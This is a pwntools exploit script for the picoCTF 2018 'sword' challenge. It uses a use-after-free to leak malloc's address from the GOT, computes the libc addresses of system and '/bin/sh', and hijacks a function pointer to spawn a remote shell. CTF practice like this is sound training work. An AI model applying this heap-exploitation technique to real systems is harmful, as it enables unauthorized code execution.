#!/usr/bin/env python

from pwn import *

pico = 1

if pico:
	r = remote("2018shell2.picoctf.com", 10491)
else:
	env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./pico64.libc.so.6")}
	r = process("./sword",env=env)
	# gdb.attach(r, '''
	# 	b *0x400eb1
	# 	c
	# 	''')

def forge():
	r.sendline("1")
	r.recv()

def harden(sword, name, len):
	r.sendline("5")
	r.recv()
	r.sendline(str(sword))
	r.recv()
	r.sendline(str(len))
	r.recv()
	r.sendline(name)
	r.recv()
	r.sendline("-1")
	r.recv()

def show(sword):
	#thanks to Weastie for fixing this
    r.recv()
    r.sendline("3")
    r.recv()
    r.sendline(str(sword))
    return r.recvlines(5)[2].split("/*")[0].split("The name is ")[1].strip()

def equip(sword):
	r.sendline("6")
	r.recv()
	r.sendline(str(sword))

libc = ELF("./libc.so.6")

MALLOC_GOT = 0x602060
PRINTF_GOT = 0x602030


log.info("Creating swords...")
# create 4 swords
forge()
forge()
forge()
forge()

log.info("Preparing malloc leak...")
# UAF to leak malloc
harden(1, "abcd", 280)
payload = ''
payload += 'A'*8
payload += p64(MALLOC_GOT)
payload = payload.ljust(32)
harden(0, payload, 32)


log.info("Leaking malloc...")
# calculate system
malloc_leak = show(1)
malloc_leak = u64(malloc_leak + '\x00\x00')
log.info("Malloc leak: " + hex(malloc_leak))

libc_base = malloc_leak - libc.symbols['malloc']
system = libc_base + libc.symbols['system']
puts = libc_base + libc.symbols['puts']
log.info("System at: " + hex(system))

binsh =  libc_base + next(libc.search("/bin/sh\x00"))
log.info("Libc binsh at: " + hex(binsh))

log.info("Preparing system call...")
harden(3, "th", 280)
payload = ''
payload += 'A'*8
payload += p64(binsh+0x40) # argument in name
payload += p64(system) # function in use_sword
harden(2, payload, len(payload))

log.info("Calling system...")
equip(3)

log.info("You should have a shell!")
r.interactive()

